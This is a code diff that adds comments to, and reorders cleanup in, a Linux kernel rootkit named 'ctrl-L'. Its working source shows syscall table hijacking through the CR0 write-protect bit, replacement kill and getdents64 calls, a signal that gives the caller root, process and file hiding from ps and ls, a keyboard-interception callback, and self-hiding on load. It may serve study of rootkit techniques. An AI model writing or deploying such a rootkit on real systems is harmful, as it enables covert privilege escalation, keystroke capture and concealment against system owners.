@@ -58,6 +58,7 @@ void rootkit_unhide(void) {
     }
 }
 
+// Used to get task from pid value passed to hijacked 'kill' call
 struct task_struct* lookup_task(pid_t pid) {
 	struct task_struct *p = current;
 	for_each_process(p) {
@@ -119,6 +120,8 @@ unsigned long *get_syscall_table(void) {
 int kb_cb(struct notifier_block *nblock, unsigned long code, void *_param) {
 	struct keyboard_notifier_param *param = _param;
 
+	// Use debug level greater than 1 or else dmesg will get cluttered with 
+	// keypress events and make it harder to find other issues being debugged
 	if (debug > 1) {
 		printk(KERN_INFO "code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
 			code, param->down, param->shift, param->value);
@@ -158,6 +161,7 @@ int kb_cb(struct notifier_block *nblock, unsigned long code, void *_param) {
 	return NOTIFY_OK;
 }
 
+// Sets all ids for a process to 0
 void escalate(void) {
 	struct cred *rootcreds;
 	
@@ -173,6 +177,8 @@ void escalate(void) {
 	commit_creds(rootcreds);
 }
 
+// Checks flag for process to see if we have marked it to be hidden
+// from getdents calls
 int is_invisible(pid_t pid) {
 	struct task_struct *task;
 	if (!pid)
@@ -185,6 +191,11 @@ int is_invisible(pid_t pid) {
 	return 0;
 }
 
+// Replacement getdents64 system call
+// Checks for processes we have marked to be hidden and does not display 
+// them when read from /proc
+// Also looks for files and directories with defined prefix and hides them
+// from tools like 'ls'
 static asmlinkage long ctrll_getdents64(const struct pt_regs *pt_regs) {
 	int fd = (int) pt_regs->di;
     struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;	
@@ -233,18 +244,24 @@ out:
 	return ret;
 }
 
+// Replacement kill system call
+// Used to give root to calling process or to hide processes
+// Must intercept valid kill signals (0-64)
 asmlinkage int ctrll_kill(const struct pt_regs *pt_regs) {
     int sig = (int) pt_regs->si;
     pid_t pid = (pid_t) pt_regs->di;
 	struct task_struct *task;
 
 	switch (sig) {
+		// Give calling process root
 		case 64:
 			if (debug) {
-				printk(KERN_INFO "ctrl-L: Giving root to PID %d", pid);
+				printk(KERN_INFO "ctrl-L: calling escalate()");
 			}
 			escalate();
 			break;
+		// Add flag to process so that our hijacked getdents call will
+		// hide it from tools like 'ps'
 		case 63:
 			if ((task = lookup_task(pid)) == NULL)
 				return -ESRCH;
@@ -260,6 +277,8 @@ asmlinkage int ctrll_kill(const struct pt_regs *pt_regs) {
 	return 0;
 }
 
+// For x86/x64 cr0 has a read only bit that needs to be changed to
+// hijack the system call table address, this will set/unset that bit
 static inline void change_cr0(unsigned long val) {
 	unsigned long __force_order;
     asm volatile("mov %0, %%cr0":"+r"(val), "+m"(__force_order));
@@ -275,17 +294,25 @@ static int __init ctrll_rootkit_init(void) {
  	   printk(KERN_INFO "ctrl-L found syscall table at: %p", sys_call_table);
 	}
 
+	// Keep a copy of regular system calls before hijacking
 	normal_kill = (t_syscall)sys_call_table[__NR_kill];
 	normal_getdents64 = (t_syscall)sys_call_table[__NR_getdents64];
 
-
+	// Change cr0 read-only bit
 	cr0 = read_cr0();
 	change_cr0(cr0 & ~0x00010000);
+
+	// Replace system calls with our version
 	sys_call_table[__NR_kill] = (unsigned long) ctrll_kill;
 	sys_call_table[__NR_getdents64] = (unsigned long) ctrll_getdents64;
+
+	// Make system call table read-only again
 	change_cr0(cr0);
+
+	// Register callback used for keyboard interception
     register_keyboard_notifier(&kb_blk);
     
+	// Hide rootkit unless option is used to leave visible
 	if (hideonload) {
 		rootkit_hide();
 	}
@@ -298,15 +325,22 @@ static int __init ctrll_rootkit_init(void) {
 
 // Clean up on module unload
 static void __exit ctrll_rootkit_exit(void) {
+	// Remove keyboard interception
 	unregister_keyboard_notifier(&kb_blk);
+
+	// Make system call table writable
+	change_cr0(cr0 & ~0x00010000);
+
+	// Put normal calls back in the table
+	sys_call_table[__NR_kill] = (unsigned long) normal_kill;
+	sys_call_table[__NR_getdents64] = (unsigned long) normal_getdents64;
+
+	// Set system call table read-only again
+	change_cr0(cr0);
+
 	if (debug) {
    		printk(KERN_INFO "ctrl-L rootkit unloaded\n");
 	}
-
-	change_cr0(cr0 & ~0x00010000);
-	sys_call_table[__NR_kill] = (unsigned long) normal_kill;
-	sys_call_table[__NR_getdents64] = (unsigned long) normal_getdents64;
-	change_cr0(cr0);
 }
 
 module_init(ctrll_rootkit_init);
